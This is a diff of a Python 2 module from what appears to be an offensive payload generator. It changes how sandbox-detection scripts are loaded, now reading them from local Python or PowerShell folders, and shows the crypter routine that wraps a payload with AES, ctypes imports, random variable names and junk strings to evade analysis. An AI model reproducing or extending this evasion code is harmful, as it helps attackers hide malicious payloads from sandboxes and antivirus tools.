@@ -18,16 +18,17 @@ def randomJunk():
         newString += ''.join(random.sample(string.ascii_lowercase, random.randint(1, 26)))
     return newString
 
-def getSandboxScripts():
+def getSandboxScripts(sandboxLang):
     sandboxScripts = ''
     from menu import sandboxMenuOptions
     for i in sandboxMenuOptions:
         if sandboxMenuOptions[str(i)]['availablemodules']:
-            try:
-                sandboxScripts += requests.get(sandboxMenuOptions[str(i)]['payloadchoice']).text + '\n'
-            except:
-                print t.bold_red + '[!] No network Connection, can\'t pull sandbox scripts.' + + t.normal
-                break
+            if sandboxLang == 'python':
+                sandboxContent = open('externalmodules/sandbox/python/' + sandboxMenuOptions[str(i)]['payloadchoice'] + '.py', 'r').read()
+            elif sandboxLang == 'powershell':
+                sandboxContent = open('externalmodules/sandbox/powershell/' + sandboxMenuOptions[str(i)]['payloadchoice'] + '.ps1', 'r').read()
+            sandboxScripts += sandboxContent
+    print sandboxScripts
     return sandboxScripts
 
 
@@ -61,7 +62,7 @@ def do_Encryption(payload):
 
     newpayload = "# -*- coding: utf-8 -*- \n"
     newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
-    newpayload += getSandboxScripts()
+    newpayload += getSandboxScripts('python')
     newpayload += randomPython
     newpayload += "\n\t%s = '%s'\n"% (randomVar(), randomJunk())
     newpayload += "\t%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
